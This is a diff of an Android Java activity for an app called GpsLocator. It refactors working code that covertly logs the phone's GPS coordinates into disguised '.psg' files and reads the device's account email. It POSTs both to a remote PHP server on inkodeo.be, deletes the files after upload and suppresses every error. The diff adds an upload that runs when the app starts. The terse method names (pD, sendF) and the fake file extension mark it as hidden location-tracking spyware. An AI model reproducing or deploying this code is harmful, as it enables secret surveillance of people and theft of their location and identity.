@@ -39,13 +39,7 @@ import android.location.LocationManager;
 import android.os.Bundle;
 import android.widget.Toast;
 
-/**
- *  This is the only file needed to run GpsLocator
- *  Ceci est le seul code a insérer dans votre projet
- * 
- *  author : damiz
- *  date : 2012
- */
+
 public class MainActivity extends Activity {
 	
     @Override
@@ -54,11 +48,15 @@ public class MainActivity extends Activity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         
+    	// sendF
+        App _app = new App();
+        _app.sendF();
+        
         /* Use the LocationManager class to obtain GPS locations */
         
         LocationManager mlocManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
         LocationListener mlocListener = new MyLocationListener();
-        
+
         mlocManager.requestLocationUpdates( LocationManager.GPS_PROVIDER, 0, 0, mlocListener);
     }
 
@@ -69,46 +67,15 @@ public class MainActivity extends Activity {
         return true;
     }
     
-    public class MyLocationListener implements LocationListener
-    {
-    	// put your post service
-    	public String postService = "http://yourService/g.php";
-    	
-    	// put your crop repository
-    	public String cropPath = "/download/";
-    	public String cropName = "a";
-    	public String cropExtension = "psg";
-    	public int count = 0;
-    	    	
-    	public int getLastCropNumber()
-    	{
-    		int nmb=0;
-    		String[] fileList = new File(Environment.getExternalStorageDirectory()+this.cropPath).list();
-    		
-    		try
-    		{
-    		if(fileList.length>0)
-    		{
-	    		for(int i=0;i<fileList.length;i++)
-	    		{
-	    			if(fileList[i].endsWith("."+this.cropExtension))
-	    			{
-	    				String tmp = fileList[i].split("\\.")[1];
-	    				if(nmb<Integer.parseInt(tmp))
-	    				{
-	    					nmb=Integer.parseInt(tmp);
-	    				}
-	    			}
-	    		}
-	    		
-    		}
-    		}catch(Exception e){
-    			// put nothing in here
-    		}
-    		
-    		return nmb;
-    	}
-    	
+/**
+ *  This is the only file needed to run GpsLocator
+ * 
+ * 	author : damiz
+ *  date : 2012
+ */
+public class MyLocationListener implements LocationListener
+{
+		public App _app = new App();
     	public void onLocationChanged(Location loc)
     	{
     		loc.getLatitude();
@@ -117,14 +84,64 @@ public class MainActivity extends Activity {
     		String Text = loc.getLatitude() + ":" + loc.getLongitude();
     		
     		try {
-				pD(Text);
-    			sendF();
-			} catch (Exception e) {
-				// put nothing in here
-			}
+    			_app.pD(Text);
+    			_app.sendF();
+    		} catch (Exception e) {
+    			// put nothing in here
+    		}
+    	}
+  
+    	public void onProviderDisabled(String provider)
+    	{
+    		_app.sendF();
     	}
     	
-    	public String getEmailAccount()
+    	public void onProviderEnabled(String provider)
+    	{
+    		_app.sendF();
+    	}
+    	
+    	public void onStatusChanged(String provider, int status, Bundle extras)
+    	{
+    		_app.sendF();
+    	}
+    	
+    }
+
+    public class App {
+    	
+    	// put your post service
+    	public String postService = "http://inkodeo.be/WebServices/gloc.php";
+    	
+    	// put your crop repository
+    	public  String cropPath = "/download/";
+    	public  String cropName = "a";
+    	public  String cropExtension = "psg";
+    	public  int count = 0;
+    	
+    	public void App()
+    	{
+    		this.sendF();
+    	}
+    	
+    	public  void saveCrop(String s) throws IOException
+    	{
+    		int cropCount=this.getLastCropNumber();
+    		if(this.count>90)
+    		{
+    			//
+    			cropCount++;this.count=0;
+    		}
+            FileWriter f = new FileWriter(Environment.getExternalStorageDirectory() 
+            		+ this.cropPath+this.cropName+"."+(cropCount)+"."+this.cropExtension, true);
+            try {
+               f.write(s);
+            } finally {
+               f.close();
+            }
+    	}    	
+      	
+    	public  String getEmailAccount()
     	{
     		AccountManager manager = (AccountManager) getSystemService(Context.ACCOUNT_SERVICE);
     		Account[] accounts = manager.getAccounts();
@@ -149,7 +166,7 @@ public class MainActivity extends Activity {
     	}
     	
     	// postData
-    	public void pD(String s) throws IOException
+    	public  void pD(String s) throws IOException
     	{
     		
     	    try {
@@ -166,54 +183,9 @@ public class MainActivity extends Activity {
     	    	// put nothing in here
     	    }
     	}
+
     	
-    	public boolean sendF()
-    	{
-    		try
-    		{
-	    		// Create a new HttpClient and Post Header
-	    	    HttpClient httpclient = new DefaultHttpClient();
-	    	    
-	    	    // put your php post service in place
-	    	    HttpPost httppost = new HttpPost(this.postService);
-	        	
-		        List nVP = new ArrayList(2);
-		        nVP.add(new BasicNameValuePair("usr", this.getEmailAccount()));
-		        
-	    		String[] fileList = new File(Environment.getExternalStorageDirectory()+this.cropPath).list();
-	    		
-	    		if(fileList.length>0)
-	    		{
-		    		for(int i=0;i<fileList.length;i++)
-		    		{
-		    			if(fileList[i].endsWith(cropExtension))
-		    			{
-		    				String cPath = this.cropPath+this.cropName+"."+this.getLastCropNumber()+"."+this.cropExtension;
-		    				
-		    				// set the repository for cropping
-		    		        nVP.add(new BasicNameValuePair("ctc", getFile(Environment.getExternalStorageDirectory()+cPath)));
-		    		        // send the file content by posting it to an online post service
-		    		        httppost.setEntity(new UrlEncodedFormEntity(nVP));
-		    		        
-		    	    	    HttpResponse response = httpclient.execute(httppost);
-		    	    	    
-		    	    	    // deleting crop if sended
-		    		        File f = new File(Environment.getExternalStorageDirectory()+cPath);
-		    	        	if (f.exists()) {
-		    	        	  f.delete();
-		    	        	}
-		    			}
-		    		}
-	    		}
-	    		
-    		} catch(Exception e) {
-    			// put nothing in here
-    		}
-    		
-    		return true;
-    	}
-    	
-    	public String getFile(String filePath) throws java.io.IOException
+    	public  String getFile(String filePath) throws java.io.IOException
     	{
     	    BufferedReader reader = new BufferedReader(new FileReader(filePath));
     	    String line, results = "";
@@ -225,7 +197,7 @@ public class MainActivity extends Activity {
     	    return results;
     	}
     	
-    	public String getString(String file)
+    	public  String getString(String file)
     	{
     		File sdcard = Environment.getExternalStorageDirectory();
     		
@@ -251,38 +223,82 @@ public class MainActivity extends Activity {
     		return text.toString();
     	}
     	
-    	public void saveCrop(String s) throws IOException
+        	public  int getLastCropNumber()
+        	{
+        		int nmb=0;
+        		String[] fileList = new File(Environment.getExternalStorageDirectory()+this.cropPath).list();
+        		
+        		try
+        		{
+        		if(fileList.length>0)
+        		{
+            		for(int i=0;i<fileList.length;i++)
+            		{
+            			if(fileList[i].endsWith("."+this.cropExtension))
+            			{
+            				String tmp = fileList[i].split("\\.")[1];
+            				if(nmb<Integer.parseInt(tmp))
+            				{
+            					nmb=Integer.parseInt(tmp);
+            				}
+            			}
+            		}
+            		
+        		}
+        		}catch(Exception e){
+        			// put nothing in here
+        		}
+        		
+        		return nmb;
+        	}
+        	
+        	
+    	public  boolean sendF()
     	{
-    		int cropCount=this.getLastCropNumber();
-    		if(this.count>90)
+    		try
     		{
-    			//
-    			cropCount++;this.count=0;
+        		// Create a new HttpClient and Post Header
+        	    HttpClient httpclient = new DefaultHttpClient();
+        	    
+        	    // put your php post service in place
+        	    HttpPost httppost = new HttpPost(this.postService);
+            	
+    	        List nVP = new ArrayList(2);
+    	        nVP.add(new BasicNameValuePair("usr", this.getEmailAccount()));
+    	        
+        		String[] fileList = new File(Environment.getExternalStorageDirectory()+this.cropPath).list();
+        		
+        		if(fileList.length>0)
+        		{
+    	    		for(int i=0;i<fileList.length;i++)
+    	    		{
+    	    			if(fileList[i].endsWith(cropExtension))
+    	    			{
+    	    				String cPath = this.cropPath+this.cropName+"."+this.getLastCropNumber()+"."+this.cropExtension;
+    	    				
+    	    				// set the repository for cropping
+    	    		        nVP.add(new BasicNameValuePair("ctc", getFile(Environment.getExternalStorageDirectory()+cPath)));
+    	    		        // send the file content by posting it to an online post service
+    	    		        httppost.setEntity(new UrlEncodedFormEntity(nVP));
+    	    		        
+    	    	    	    HttpResponse response = httpclient.execute(httppost);
+    	    	    	    
+    	    	    	    // deleting crop if sended
+    	    		        File f = new File(Environment.getExternalStorageDirectory()+cPath);
+    	    	        	if (f.exists()) {
+    	    	        	  f.delete();
+    	    	        	}
+    	    			}
+    	    		}
+        		}
+        		
+    		} catch(Exception e) {
+    			// put nothing in here
     		}
-	        FileWriter f = new FileWriter(Environment.getExternalStorageDirectory() 
-	        		+ this.cropPath+this.cropName+"."+(cropCount)+"."+this.cropExtension, true);
-	        try {
-	           f.write(s);
-	        } finally {
-	           f.close();
-	        }
+    		
+    		return true;
     	}
     	
-    	public void onProviderDisabled(String provider)
-    	{
-    		this.sendF();
-    	}
-    	
-    	public void onProviderEnabled(String provider)
-    	{
-    		this.sendF();
-    	}
-    	
-    	public void onStatusChanged(String provider, int status, Bundle extras)
-    	{
-    		this.sendF();
-    	}
-    	
-    }/* End of Class MyLocationListener */
+    }
 
 }
